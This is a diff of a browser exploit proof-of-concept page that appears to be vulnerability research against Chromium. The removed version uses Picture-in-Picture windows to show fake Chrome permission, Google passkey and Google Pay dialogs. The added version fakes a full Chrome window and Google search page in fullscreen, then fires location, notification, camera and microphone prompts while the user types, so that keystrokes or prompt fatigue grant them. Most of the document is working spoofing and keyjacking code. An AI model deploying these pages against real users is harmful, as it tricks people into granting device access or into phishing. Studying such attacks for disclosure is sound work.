@@ -1,335 +1,251 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>PoC 1: Document PiP Permission Prompt Overlay</title>
+<title>PoC 2: Fullscreen + Permission Keyjacking</title>
+<!--
+  VH-2026-002: Fullscreen + Permission Prompt Keyjacking
 
+  Target: Chromium 146+ (Desktop)
+
+  Technique: Chromium's anti-keyjacking defense on permission dialogs
+  uses a ~500ms activation delay. This PoC attempts to bypass it by:
+
+  1. Enter fullscreen and render a fake browser UI with an input field
+  2. Encourage the user to type (e.g., fake search box, chat input)
+  3. While user is actively typing, trigger a permission prompt
+  4. Test if the user's ongoing typing/keypresses can interact with
+     the permission dialog before the activation delay expires
+
+  Sub-techniques:
+  A) Rapid Enter key during typing -> keyjack the Accept button
+  B) Tab key during typing -> focus the Accept button, then Enter
+  C) Space bar during typing -> activate focused Accept button
+
+  Chromium defense: InputEventActivationProtector with 500ms delay.
+  But this may not account for:
+  - Keys already held down when the dialog appears
+  - Keyboard repeat events from held keys
+  - Platform-specific keyboard behavior (macOS key repeat)
+-->
 </head>
-<body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; padding: 40px; background: #f0f0f0;">
+<body style="font-family: -apple-system, sans-serif; margin: 0; padding: 40px; background: #f0f0f0;">
 
-<h2>Document PiP + Permission Prompt Overlay</h2>
-<p>Tests whether a Document PiP window can overlay/interfere with Chrome's permission prompts.</p>
+<h2>Fullscreen + Permission Keyjacking</h2>
+<p>Tests whether ongoing keyboard input can interact with permission prompts during the activation delay.</p>
 
 <div style="display: flex; gap: 12px; flex-wrap: wrap; margin: 20px 0;">
-  <button onclick="testVariantA()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #dc3545; color: #fff; border: none; border-radius: 8px;">
-    A: PiP + Real Permission Race
+  <button onclick="testEnterKeyjack()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #dc3545; color: #fff; border: none; border-radius: 8px;">
+    A: Enter Key Keyjack
   </button>
-  <button onclick="testVariantB()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #007bff; color: #fff; border: none; border-radius: 8px;">
-    B: PiP Fake Permission Dialog
+  <button onclick="testTabKeyjack()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #fd7e14; color: #fff; border: none; border-radius: 8px;">
+    B: Tab+Enter Keyjack
   </button>
-  <button onclick="testVariantC()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #28a745; color: #fff; border: none; border-radius: 8px;">
-    C: PiP + WebAuthn Prompt
+  <button onclick="testFullscreenNotification()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #007bff; color: #fff; border: none; border-radius: 8px;">
+    C: Fullscreen Notification Dismiss Race
   </button>
-  <button onclick="testVariantD()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #6f42c1; color: #fff; border: none; border-radius: 8px;">
-    D: PiP + PaymentRequest
+  <button onclick="testFullscreenMultiDialog()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #6f42c1; color: #fff; border: none; border-radius: 8px;">
+    D: Multi-Dialog Confusion
   </button>
 </div>
 
-<div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 400px; overflow-y: auto;"></div>
+<div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 300px; overflow-y: auto;"></div>
 
 <script>
 function log(msg) {
   const el = document.getElementById('log');
-  el.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
-  el.scrollTop = el.scrollHeight;
+  if (el) el.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
 }
 
-// Check if Document PiP API is available
-function checkDocPiP() {
-  if (!('documentPictureInPicture' in window)) {
-    log('ERROR: Document PiP API not available. Chrome 116+ required.');
-    log('Enable: chrome://flags/#document-picture-in-picture-api');
-    return false;
-  }
-  return true;
-}
-
-// Variant A: Open PiP then trigger real permission prompt
-// Test if PiP can occlude the origin shown in the permission bubble
-async function testVariantA() {
-  if (!checkDocPiP()) return;
-  log('[A] Opening Document PiP window...');
-
+// Enter fullscreen and render a fake browser with a text input
+async function enterFakeChrome(callback) {
   try {
-    // Open a Document PiP window - this is the attacker's overlay
-    const pipWindow = await documentPictureInPicture.requestWindow({
-      width: 340,
-      height: 180,
-    });
+    await document.documentElement.requestFullscreen();
+  } catch(e) {
+    log('Fullscreen failed: ' + e.message);
+    return;
+  }
 
-    log('[A] PiP window opened');
+  // Replace body with fake Chrome UI
+  document.body.style.margin = '0';
+  document.body.style.padding = '0';
+  document.body.style.background = '#fff';
+  document.body.innerHTML = `
+    <!-- Fake Chrome toolbar -->
+    <div style="background: #dee1e6; padding: 4px 8px; display: flex; align-items: center; gap: 6px; height: 36px;">
+      <div style="display: flex; gap: 4px; align-items: center;">
+        <div style="width: 12px; height: 12px; border-radius: 50%; background: #ff5f57;"></div>
+        <div style="width: 12px; height: 12px; border-radius: 50%; background: #febc2e;"></div>
+        <div style="width: 12px; height: 12px; border-radius: 50%; background: #28c840;"></div>
+      </div>
+      <div style="flex: 1;"></div>
+    </div>
 
-    // Style the PiP content to look like a permission prompt origin indicator
-    pipWindow.document.body.innerHTML = `
-      <div style="
-        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-        padding: 0; margin: 0;
-        background: #fff;
-        border-radius: 0 0 8px 8px;
-      ">
-        <div style="
-          background: #f8f9fa;
-          padding: 12px 16px;
-          border-bottom: 1px solid #e0e0e0;
-          display: flex;
-          align-items: center;
-          gap: 8px;
-        ">
-          <svg width="16" height="16" viewBox="0 0 16 16" fill="#1a73e8">
-            <circle cx="8" cy="8" r="8"/>
-            <text x="8" y="12" text-anchor="middle" fill="#fff" font-size="11" font-weight="bold">i</text>
-          </svg>
-          <span style="font-size: 13px; color: #202124; font-weight: 500;">
-            https://mybank.com wants to
-          </span>
-        </div>
-        <div style="padding: 16px;">
-          <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 12px;">
-            <svg width="20" height="20" fill="#5f6368" viewBox="0 0 24 24">
-              <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
-            </svg>
-            <span style="font-size: 13px; color: #5f6368;">Know your location</span>
-          </div>
-          <div style="display: flex; gap: 8px; justify-content: flex-end;">
-            <button style="padding: 8px 16px; background: #fff; border: 1px solid #dadce0; border-radius: 4px; color: #1a73e8; cursor: pointer; font-size: 13px;">Block</button>
-            <button id="fakeAllow" style="padding: 8px 16px; background: #1a73e8; border: none; border-radius: 4px; color: #fff; cursor: pointer; font-size: 13px;">Allow</button>
-          </div>
+    <!-- Fake tab bar -->
+    <div style="background: #dee1e6; padding: 0 8px; display: flex; align-items: end; height: 32px;">
+      <div style="background: #fff; padding: 6px 16px; border-radius: 8px 8px 0 0; font-size: 12px; color: #5f6368; display: flex; align-items: center; gap: 6px;">
+        <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16'><rect fill='%234285f4' width='16' height='16' rx='2'/><text x='8' y='12' text-anchor='middle' fill='white' font-size='10'>G</text></svg>" width="16" height="16">
+        Google
+      </div>
+    </div>
+
+    <!-- Fake address bar -->
+    <div style="background: #fff; padding: 8px 12px; border-bottom: 1px solid #e0e0e0; display: flex; align-items: center;">
+      <div style="flex: 1; background: #f1f3f4; border-radius: 20px; padding: 8px 16px; display: flex; align-items: center; gap: 8px;">
+        <svg width="16" height="16" fill="#5f6368" viewBox="0 0 24 24">
+          <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+        </svg>
+        <span style="font-size: 14px; color: #202124;">google.com</span>
+      </div>
+    </div>
+
+    <!-- Fake Google search page with input -->
+    <div style="text-align: center; padding: 80px 20px;">
+      <div style="font-size: 92px; margin-bottom: 30px;">
+        <span style="color: #4285f4;">G</span><span style="color: #ea4335;">o</span><span style="color: #fbbc05;">o</span><span style="color: #4285f4;">g</span><span style="color: #34a853;">l</span><span style="color: #ea4335;">e</span>
+      </div>
+      <div style="max-width: 580px; margin: 0 auto;">
+        <input id="fakeSearch" type="text" autofocus
+               placeholder="Search Google or type a URL"
+               style="width: 100%; padding: 14px 20px; font-size: 16px; border: 1px solid #dfe1e5; border-radius: 24px; outline: none; box-sizing: border-box;"
+               onkeydown="handleKey(event)">
+        <div style="margin-top: 20px; display: flex; gap: 12px; justify-content: center;">
+          <button style="padding: 10px 16px; background: #f8f9fa; border: 1px solid #f8f9fa; border-radius: 4px; font-size: 14px; color: #3c4043; cursor: pointer;">Google Search</button>
+          <button style="padding: 10px 16px; background: #f8f9fa; border: 1px solid #f8f9fa; border-radius: 4px; font-size: 14px; color: #3c4043; cursor: pointer;">I'm Feeling Lucky</button>
         </div>
       </div>
-    `;
+    </div>
+  `;
 
-    // If user clicks the fake "Allow" button
-    pipWindow.document.getElementById('fakeAllow').onclick = () => {
-      log('[A] USER CLICKED FAKE ALLOW BUTTON');
-      log('[A] Attacker could now: redirect to phishing page, capture credentials, etc.');
-      pipWindow.close();
-    };
+  // Focus the fake search input
+  setTimeout(() => {
+    const input = document.getElementById('fakeSearch');
+    if (input) input.focus();
+    if (callback) callback();
+  }, 100);
+}
 
-    log('[A] Fake permission prompt rendered in PiP window');
-    log('[A] PiP window should float above all other content');
-    log('[A] CHECK: Does the PiP window have a visible origin titlebar?');
-    log('[A] CHECK: Can the PiP content visually overlap with Chrome\'s permission bubble?');
+let keyCount = 0;
+let permissionTriggered = false;
 
-    // Now trigger a REAL permission prompt after a delay
-    // This tests if the PiP can occlude the real prompt
+function handleKey(e) {
+  keyCount++;
+  // After user has typed several characters, trigger permission
+  if (keyCount >= 5 && !permissionTriggered) {
+    permissionTriggered = true;
+    triggerPermission();
+  }
+}
+
+function triggerPermission() {
+  // Trigger geolocation permission after the user is actively typing
+  // The hypothesis: user's ongoing keypresses may hit the dialog
+  navigator.geolocation.getCurrentPosition(
+    () => { /* granted */ },
+    () => { /* denied */ }
+  );
+}
+
+// Variant A: Enter key keyjacking
+function testEnterKeyjack() {
+  log('[A] Entering fullscreen with fake Chrome UI...');
+  log('[A] Type something in the search box, then rapidly hit Enter');
+  log('[A] After 5 keystrokes, a permission prompt will appear');
+  log('[A] CHECK: Does the Enter key interact with the permission prompt?');
+
+  keyCount = 0;
+  permissionTriggered = false;
+  enterFakeChrome();
+}
+
+// Variant B: Tab keyjacking
+function testTabKeyjack() {
+  log('[B] Similar to A, but tests Tab key focus behavior');
+  log('[B] Type in the search box, permission prompt appears');
+  log('[B] CHECK: Does Tab key move focus to the permission dialog?');
+
+  keyCount = 0;
+  permissionTriggered = false;
+  enterFakeChrome();
+}
+
+// Variant C: Race the fullscreen notification dismiss
+// When entering fullscreen, Chrome shows "Press Esc to exit full screen"
+// If we trigger a permission prompt WHILE the notification is visible,
+// the Esc key press intended to exit fullscreen might interact with the prompt
+function testFullscreenNotification() {
+  log('[C] Testing fullscreen notification + permission race...');
+  log('[C] Enter fullscreen -> immediately trigger permission');
+  log('[C] The "Press Esc to exit" notification competes with the permission bubble');
+
+  document.documentElement.requestFullscreen().then(() => {
+    // Immediately trigger permission prompt
+    // This races with the fullscreen notification
     setTimeout(() => {
-      log('[A] Triggering real geolocation permission request...');
+      log('[C] Triggering permission during fullscreen notification...');
       navigator.geolocation.getCurrentPosition(
-        () => log('[A] Geolocation GRANTED'),
-        (e) => log('[A] Geolocation denied/error: ' + e.message)
+        () => log('[C] Geolocation GRANTED'),
+        () => log('[C] Geolocation denied')
       );
-      log('[A] Real permission prompt should appear');
-      log('[A] CHECK: Does PiP window overlay the real permission prompt?');
-      log('[A] CHECK: Can user see which origin is actually requesting permission?');
-    }, 1000);
+    }, 50); // Very small delay - notification should still be visible
 
-  } catch(e) {
-    log('[A] Error: ' + e.message);
-  }
+    // Also trigger notification permission
+    setTimeout(() => {
+      Notification.requestPermission().then(p => {
+        log('[C] Notification permission: ' + p);
+      });
+    }, 100);
+
+    log('[C] CHECK: Are both the fullscreen notification and permission prompt visible?');
+    log('[C] CHECK: Does the fullscreen notification overlay the permission prompt?');
+    log('[C] CHECK: Is the permission prompt origin visible?');
+  }).catch(e => log('[C] Error: ' + e.message));
 }
 
-// Variant B: PiP window that IS the fake permission dialog
-// No real permission prompt involved - pure social engineering via PiP
-async function testVariantB() {
-  if (!checkDocPiP()) return;
-  log('[B] Opening fake permission dialog via Document PiP...');
+// Variant D: Multiple dialogs to create confusion
+// Rapidly trigger multiple permission prompts and JS dialogs
+// to overwhelm the user and cause them to click through
+function testFullscreenMultiDialog() {
+  log('[D] Testing multi-dialog confusion in fullscreen...');
 
-  try {
-    const pipWindow = await documentPictureInPicture.requestWindow({
-      width: 400,
-      height: 220,
-    });
-
-    // Render a pixel-perfect Chrome permission prompt
-    pipWindow.document.body.style.margin = '0';
-    pipWindow.document.body.style.overflow = 'hidden';
-    pipWindow.document.body.innerHTML = `
-      <div style="
-        font-family: 'Segoe UI', -apple-system, sans-serif;
-        background: #fff;
-        border-radius: 8px;
-        box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-        overflow: hidden;
-      ">
-        <!-- Fake Chrome permission bubble -->
-        <div style="padding: 16px 20px;">
-          <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 14px;">
-            <div style="width: 32px; height: 32px; background: #4285f4; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
-              <svg width="18" height="18" fill="#fff" viewBox="0 0 24 24">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
-              </svg>
-            </div>
-            <div>
-              <div style="font-size: 14px; font-weight: 600; color: #202124;">
-                accounts.google.com
-              </div>
-              <div style="font-size: 12px; color: #5f6368;">
-                wants to verify your identity
-              </div>
-            </div>
-          </div>
-
-          <div style="background: #f8f9fa; border-radius: 8px; padding: 12px; margin-bottom: 14px;">
-            <div style="font-size: 13px; color: #3c4043;">
-              Sign in with your passkey for <strong>Google Account</strong>
-            </div>
-            <div style="font-size: 12px; color: #5f6368; margin-top: 4px;">
-              jody.r*****@gmail.com
-            </div>
-          </div>
-
-          <div style="display: flex; gap: 8px; justify-content: flex-end;">
-            <button onclick="document.body.innerHTML='<p style=padding:20px>Cancelled</p>'"
-                    style="padding: 8px 24px; background: #fff; border: 1px solid #dadce0; border-radius: 20px; color: #1a73e8; cursor: pointer; font-size: 14px;">
-              Cancel
-            </button>
-            <button onclick="window.opener?.postMessage({type:'pip-phish',action:'allow'},'*')"
-                    style="padding: 8px 24px; background: #1a73e8; border: none; border-radius: 20px; color: #fff; cursor: pointer; font-size: 14px;">
-              Continue
-            </button>
-          </div>
+  document.documentElement.requestFullscreen().then(() => {
+    // Render fake Chrome UI
+    document.body.style.margin = '0';
+    document.body.innerHTML = `
+      <div style="background: #fff; height: 100vh; display: flex; align-items: center; justify-content: center;">
+        <div style="text-align: center;">
+          <h1 style="color: #202124;">Loading secure content...</h1>
+          <div style="width: 40px; height: 40px; border: 3px solid #1a73e8; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto;"></div>
+          <p style="color: #5f6368;">Please wait while we verify your identity</p>
         </div>
       </div>
+      <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
     `;
 
-    log('[B] Fake Google passkey prompt rendered in PiP window');
-    log('[B] This floats above ALL windows - not just the browser');
-    log('[B] CHECK: Can user distinguish this from a real Chrome dialog?');
-    log('[B] CHECK: Does the PiP titlebar clearly show attacker origin?');
+    // Chain of permission requests with varying delays
+    // Goal: user gets fatigued and clicks "Allow" on one
+    const delays = [500, 1200, 2000, 3500];
+    const permissions = [
+      () => navigator.geolocation.getCurrentPosition(() => log('[D] Geo GRANTED'), () => {}),
+      () => Notification.requestPermission().then(p => log('[D] Notif: ' + p)),
+      () => navigator.mediaDevices.getUserMedia({video: true}).then(() => log('[D] Camera GRANTED')).catch(() => {}),
+      () => navigator.mediaDevices.getUserMedia({audio: true}).then(() => log('[D] Mic GRANTED')).catch(() => {}),
+    ];
 
-  } catch(e) {
-    log('[B] Error: ' + e.message);
-  }
-
-  // Listen for the phishing response
-  window.addEventListener('message', (e) => {
-    if (e.data?.type === 'pip-phish') {
-      log('[B] USER INTERACTED WITH FAKE DIALOG: ' + JSON.stringify(e.data));
-    }
-  });
-}
-
-// Variant C: PiP + WebAuthn credential prompt
-// Create PiP that mimics WebAuthn/passkey UI while triggering real navigator.credentials
-async function testVariantC() {
-  if (!checkDocPiP()) return;
-  log('[C] Testing PiP + WebAuthn interaction...');
-
-  try {
-    // First open PiP with fake WebAuthn prompt
-    const pipWindow = await documentPictureInPicture.requestWindow({
-      width: 380,
-      height: 280,
+    delays.forEach((delay, i) => {
+      setTimeout(() => {
+        if (i < permissions.length) {
+          log('[D] Triggering permission ' + (i + 1) + '...');
+          permissions[i]();
+        }
+      }, delay);
     });
 
-    pipWindow.document.body.style.margin = '0';
-    pipWindow.document.body.innerHTML = `
-      <div style="font-family: -apple-system, sans-serif; padding: 24px; background: #fff;">
-        <div style="text-align: center; margin-bottom: 16px;">
-          <svg width="48" height="48" viewBox="0 0 24 24" fill="#1a73e8">
-            <path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/>
-          </svg>
-        </div>
-        <h3 style="text-align: center; margin: 0 0 8px; font-size: 16px; color: #202124;">
-          Use your passkey to sign in to google.com
-        </h3>
-        <p style="text-align: center; color: #5f6368; font-size: 13px; margin: 0 0 20px;">
-          If you registered a passkey with google.com, you can use it to sign in.
-        </p>
-        <div style="display: flex; justify-content: center; gap: 12px;">
-          <button style="padding: 10px 24px; background: #fff; border: 1px solid #dadce0; border-radius: 20px; cursor: pointer; font-size: 14px; color: #1a73e8;">
-            Use a different method
-          </button>
-          <button id="fakeAuth" style="padding: 10px 24px; background: #1a73e8; border: none; border-radius: 20px; cursor: pointer; font-size: 14px; color: #fff;">
-            Continue
-          </button>
-        </div>
-      </div>
-    `;
+    log('[D] Multiple permission prompts will appear in sequence');
+    log('[D] CHECK: How does Chrome handle rapid permission requests in fullscreen?');
+    log('[D] CHECK: Is the origin visible for each prompt?');
+    log('[D] CHECK: Can the user easily distinguish and respond to each?');
 
-    log('[C] Fake WebAuthn prompt in PiP');
-
-    pipWindow.document.getElementById('fakeAuth').onclick = () => {
-      log('[C] User clicked Continue in fake WebAuthn PiP');
-      // Could redirect to phishing page now
-      pipWindow.close();
-    };
-
-    // Attempt to trigger real WebAuthn
-    setTimeout(async () => {
-      log('[C] Triggering real navigator.credentials.get()...');
-      try {
-        const credential = await navigator.credentials.get({
-          publicKey: {
-            challenge: new Uint8Array(32),
-            rpId: location.hostname,
-            allowCredentials: [],
-            userVerification: 'preferred',
-            timeout: 60000,
-          }
-        });
-        log('[C] Credential received: ' + credential?.id);
-      } catch(e) {
-        log('[C] WebAuthn error (expected if no credential): ' + e.message);
-        log('[C] CHECK: Did the real WebAuthn prompt appear?');
-        log('[C] CHECK: Was the PiP window visible alongside it?');
-        log('[C] CHECK: Could user confuse PiP content with the real prompt?');
-      }
-    }, 500);
-
-  } catch(e) {
-    log('[C] Error: ' + e.message);
-  }
-}
-
-// Variant D: PiP + PaymentRequest
-async function testVariantD() {
-  if (!checkDocPiP()) return;
-  log('[D] Testing PiP + PaymentRequest interaction...');
-
-  try {
-    const pipWindow = await documentPictureInPicture.requestWindow({
-      width: 360,
-      height: 300,
-    });
-
-    pipWindow.document.body.style.margin = '0';
-    pipWindow.document.body.innerHTML = `
-      <div style="font-family: -apple-system, sans-serif; padding: 20px; background: #fff;">
-        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid #e0e0e0;">
-          <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='24' height='24'><rect fill='%234285f4' width='24' height='24' rx='4'/><text x='12' y='17' text-anchor='middle' fill='white' font-size='14'>G</text></svg>" width="24" height="24">
-          <span style="font-size: 14px; font-weight: 600;">Google Pay</span>
-        </div>
-        <div style="margin-bottom: 16px;">
-          <div style="font-size: 24px; font-weight: 700; color: #202124;">$4.99</div>
-          <div style="font-size: 13px; color: #5f6368;">Premium Subscription - netflix.com</div>
-        </div>
-        <div style="background: #f8f9fa; border-radius: 8px; padding: 12px; margin-bottom: 16px;">
-          <div style="font-size: 13px; color: #3c4043;">
-            Visa ****4242<br>
-            <span style="color: #5f6368;">jody.r*****@gmail.com</span>
-          </div>
-        </div>
-        <button onclick="window.opener?.postMessage({type:'pip-payment',status:'confirmed'},'*')"
-                style="width: 100%; padding: 12px; background: #1a73e8; border: none; border-radius: 20px; color: #fff; cursor: pointer; font-size: 15px; font-weight: 500;">
-          Pay $4.99
-        </button>
-      </div>
-    `;
-
-    log('[D] Fake Google Pay prompt rendered in PiP');
-    log('[D] This creates a floating "payment confirmation" that overlays everything');
-    log('[D] CHECK: Is attacker origin clearly visible in PiP titlebar?');
-    log('[D] CHECK: Could user mistake this for a real payment dialog?');
-
-  } catch(e) {
-    log('[D] Error: ' + e.message);
-  }
-
-  window.addEventListener('message', (e) => {
-    if (e.data?.type === 'pip-payment') {
-      log('[D] USER CONFIRMED FAKE PAYMENT: ' + JSON.stringify(e.data));
-    }
-  });
+  }).catch(e => log('[D] Error: ' + e.message));
 }
 </script>
 </body>
